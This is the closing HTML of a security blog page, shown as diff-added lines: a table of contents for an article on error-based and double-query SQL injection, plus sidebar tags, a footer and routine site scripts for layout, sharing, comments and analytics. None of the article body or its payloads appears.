+  <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Preface"><span class="toc-number">1.</span> <span class="toc-text">Preface</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Understanding-Error-Based-Double-Query"><span class="toc-number">2.</span> <span class="toc-text">Understanding Error Based/Double Query</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#How-do-you-know-you-should-use-Error-Based-Double-Query-Important"><span class="toc-number">3.</span> <span class="toc-text">How do you know you should use Error Based/Double Query? (Important!)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Lets-start-with-Error-Based-SQL-injection"><span class="toc-number">4.</span> <span class="toc-text">Lets start with Error Based SQL injection</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#First-approach-is-knowing-the-version-of-the-database"><span class="toc-number">4.1.</span> <span class="toc-text">First approach is knowing the version of the database</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Second-step-Getting-the-database-name"><span class="toc-number">4.2.</span> <span class="toc-text">Second step: Getting the database name</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Third-Step-Getting-the-TABLE-NAMES"><span class="toc-number">4.3.</span> <span class="toc-text">Third Step: Getting the TABLE NAMES</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Fourth-Step-Getting-Columns-from-specific-TABLE-NAMES"><span class="toc-number">4.4.</span> <span class="toc-text">Fourth Step: Getting Columns from specific TABLE NAMES</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Fifth-Step-Extracting-the-data-from-Columns"><span class="toc-number">4.5.</span> <span class="toc-text">Fifth Step: Extracting the data from Columns</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Now-Lets-Start-with-DOUBLE-Query-SQL-Injection"><span class="toc-number">5.</span> <span class="toc-text">Now Lets Start with DOUBLE Query SQL Injection</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Step1-Getting-the-database-version"><span class="toc-number">5.1.</span> <span class="toc-text">Step1: Getting the database version</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Step2-Getting-the-Database"><span class="toc-number">5.2.</span> <span class="toc-text">Step2: Getting the Database</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Step3-Getting-the-Table-Names"><span class="toc-number">5.3.</span> <span class="toc-text">Step3: Getting the Table Names</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Step4-Getting-Column-names-from-specific-Tables-and-Database"><span class="toc-number">5.4.</span> <span class="toc-text">Step4: Getting Column names from specific Tables and Database</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Step5-Getting-the-Data-from-the-Columns-with-the-help-of-Table-name-and-Database-name"><span class="toc-number">5.5.</span> <span class="toc-text">Step5: Getting the Data from the Columns with the help of Table name and Database name</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Conclusion"><span class="toc-number">6.</span> <span class="toc-text">Conclusion</span></a></li></ol>
+  </div>
+
+<div id="asidepart">
+<div class="closeaside"><a class="closebutton" href="#" title="隐藏侧边栏"></a></div>
+<aside class="clearfix">
+
+  
+<div class="categorieslist">
+	<p class="asidetitle">分类</p>
+		<ul>
+		
+			<li><a href="/categories/A-SQLi/" title="A-SQLi">A-SQLi<sup>7</sup></a></li>
+		
+			<li><a href="/categories/B-XSS/" title="B-XSS">B-XSS<sup>2</sup></a></li>
+		
+			<li><a href="/categories/H-AttackFlow/" title="H-AttackFlow">H-AttackFlow<sup>1</sup></a></li>
+		
+			<li><a href="/categories/T-Tools/" title="T-Tools">T-Tools<sup>1</sup></a></li>
+		
+			<li><a href="/categories/Z-Other/" title="Z-Other">Z-Other<sup>1</sup></a></li>
+		
+		</ul>
+</div>
+
+
+  
+<div class="tagslist">
+	<p class="asidetitle">标签</p>
+		<ul class="clearfix">
+		
+			<li><a href="/tags/Blind/" title="Blind">Blind<sup>2</sup></a></li>
+		
+			<li><a href="/tags/Boolean-Based/" title="Boolean Based">Boolean Based<sup>2</sup></a></li>
+		
+			<li><a href="/tags/Dork/" title="Dork">Dork<sup>1</sup></a></li>
+		
+			<li><a href="/tags/Double-Query/" title="Double Query">Double Query<sup>1</sup></a></li>
+		
+			<li><a href="/tags/Error-Based/" title="Error Based">Error Based<sup>1</sup></a></li>
+		
+			<li><a href="/tags/MegaSQLi/" title="MegaSQLi">MegaSQLi<sup>4</sup></a></li>
+		
+			<li><a href="/tags/String-Based/" title="String Based">String Based<sup>1</sup></a></li>
+		
+			<li><a href="/tags/crypt/" title="crypt">crypt<sup>1</sup></a></li>
+		
+			<li><a href="/tags/hash/" title="hash">hash<sup>1</sup></a></li>
+		
+		</ul>
+</div>
+
+
+  <div class="linkslist">
+  <p class="asidetitle">友情链接</p>
+</div>
+
+
+  <div class="rsspart">
+	<a href="/atom.xml" target="_blank" title="rss">RSS 订阅</a>
+</div>
+
+</aside>
+<div>
+<br />
+</div>
+
+    </div>
+</div>
+    <footer><div id="footer" >
+	
+    <div class="social-font" class="clearfix">
+        
+        <a href="http://weibo.com/5050395856" target="_blank" class="icon-weibo" title="weibo"></a>
+        
+        
+        <a href="https://github.com/tudouya" target="_blank" class="icon-github" title="github"></a>
+        
+        
+        
+        
+        
+        
+        <a href="mailto:568865013@qq.com" target="_blank" class="icon-email" title="Email Me"></a>
+        
+    </div>
+	<section class="info">
+		<p class="l1">
+            keep foolish~keep hungry
+        </p>
+            <!-- <br/> -->
+        <p class="l2">
+			～如果我们不选择堕落，那么地狱的存在还有什么意义～
+        </p>
+	</section>
+	 
+		<p class="copyright">Powered by <a href="http://zespia.tw/hexo/" target="_blank" title="hexo">hexo</a> and Theme by <a href="https://github.com/RagingCat/hexo-theme-ragingcat" target="_blank" title="hexo-theme-ragingcat">Raging Cat</a> © 2016
+		
+		<a href="http://sec.php101.cn/about" target="_blank" title="tudouya">tudouya</a>
+		
+		</p>
+</div></footer>
+    <script src="/js/jquery-2.0.3.min.js"></script>
+<script type="text/javascript">
+$(document).ready(function(){
+  $('.navbar').click(function(){
+    $('header nav').toggleClass('shownav');
+  });
+  var myWidth = 0;
+  function getSize(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+  };
+  var m = $('#main'),
+      a = $('#asidepart'),
+      c = $('.closeaside'),
+      o = $('.openaside');
+  $(window).resize(function(){
+    getSize();
+    if (myWidth >= 1024) {
+      $('header nav').removeClass('shownav');
+    }else
+    {
+      m.removeClass('moveMain');
+      a.css('display', 'block').removeClass('fadeOut');
+      o.css('display', 'none');
+      
+      $('#toc.toc-aside').css('display', 'none');
+      
+    }
+  });
+  c.click(function(){
+    a.addClass('fadeOut').css('display', 'none');
+    o.css('display', 'block').addClass('fadeIn');
+    m.addClass('moveMain');
+  });
+  o.click(function(){
+    o.css('display', 'none').removeClass('beforeFadeIn');
+    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');
+    m.removeClass('moveMain');
+  });
+  $(window).scroll(function(){
+    o.css("top",Math.max(80,260-$(this).scrollTop()));
+  });
+});
+</script>
+
+<script type="text/javascript">
+$(document).ready(function(){
+  var ai = $('.article-content>iframe'),
+      ae = $('.article-content>embed'),
+      t  = $('#toc'),
+      h  = $('article h2')
+      ah = $('article h2'),
+      ta = $('#toc.toc-aside'),
+      o  = $('.openaside'),
+      c  = $('.closeaside');
+  if(ai.length>0){
+    ai.wrap('<div class="video-container" />');
+  };
+  if(ae.length>0){
+   ae.wrap('<div class="video-container" />');
+  };
+  if(ah.length==0){
+    t.css('display','none');
+  }else{
+    c.click(function(){
+      ta.css('display', 'block').addClass('fadeIn');
+    });
+    o.click(function(){
+      ta.css('display', 'none');
+    });
+    $(window).scroll(function(){
+      ta.css("top",Math.max(140,320-$(this).scrollTop()));
+    });
+  };
+});
+</script>
+
+
+<script type="text/javascript">
+$(document).ready(function(){
+  var $this = $('.share'),
+      url = $this.attr('data-url'),
+      encodedUrl = encodeURIComponent(url),
+      title = $this.attr('data-title'),
+      tsina = $this.attr('data-tsina');
+  var html = [
+  '<a href="#" class="overlay" id="qrcode"></a>',
+  '<div class="qrcode clearfix"><span>扫描二维码分享到微信朋友圈</span><a class="qrclose" href="#share"></a><strong>Loading...Please wait</strong><img id="qrcode-pic" data-src="http://s.jiathis.com/qrcode.php?url=' + encodedUrl + '"/></div>',
+  '<a href="#textlogo" class="article-back-to-top" title="Top"></a>',
+  '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="article-share-facebook" target="_blank" title="Facebook"></a>',
+  '<a href="#qrcode" class="article-share-qrcode" title="QRcode"></a>',
+  '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="article-share-twitter" target="_blank" title="Twitter"></a>',
+  '<a href="http://service.weibo.com/share/share.php?title='+title+'&url='+encodedUrl +'&ralateUid='+ tsina +'&searchPic=true&style=number' +'" class="article-share-weibo" target="_blank" title="Weibo"></a>',
+  '<span title="Share to"></span>'
+  ].join('');
+  $this.append(html);
+  $('.article-share-qrcode').click(function(){
+    var imgSrc = $('#qrcode-pic').attr('data-src');
+    $('#qrcode-pic').attr('src', imgSrc);
+    $('#qrcode-pic').load(function(){
+        $('.qrcode strong').text(' ');
+    });
+  });
+});
+</script>
+
+
+<script type="text/javascript">
+  var duoshuoQuery = {short_name:"ragingcat"};
+  (function() {
+    var ds = document.createElement('script');
+    ds.type = 'text/javascript';ds.async = true;
+    ds.src = '//static.duoshuo.com/embed.js';
+    ds.charset = 'UTF-8';
+    (document.getElementsByTagName('head')[0]
+    || document.getElementsByTagName('body')[0]).appendChild(ds);
+  })();
+</script>
+
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<style type="text/css">
+</style>
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script src="//cdn.bootcss.com/highlight.js/9.2.0/highlight.min.js"></script><script type="text/javascript">
+$(document).ready(function(){
+    $('pre').each(function(i, block) {
+      hljs.highlightBlock(block);
+    });
+    $('.article-content').each(function(i){
+    $(this).find('img').each(function(){
+      if ($(this).parent().hasClass('fancybox')) return;
+      var alt = this.alt;
+      if (alt) $(this).after('<span class="caption">' + alt + '</span>');
+      $(this).wrap('<a href="' + this.src + '" title="' + alt + '" class="fancybox"></a>');
+    });
+    $(this).find('.fancybox').each(function(){
+      $(this).attr('rel', 'article' + i);
+    });
+  });
+  if($.fancybox){
+    $('.fancybox').fancybox();
+  }
+});
+</script>
+
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-60243036-1', 'auto');
+  ga('send', 'pageview');
+
+</script>
+
+
+
+<script type="text/x-mathjax-config">
+MathJax.Hub.Config({
+  tex2jax: {inlineMath: [['$','$'], ['\\(','\\)']]}
+});
+</script>
+<script type="text/javascript"
+   src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+  </body>
+</html>
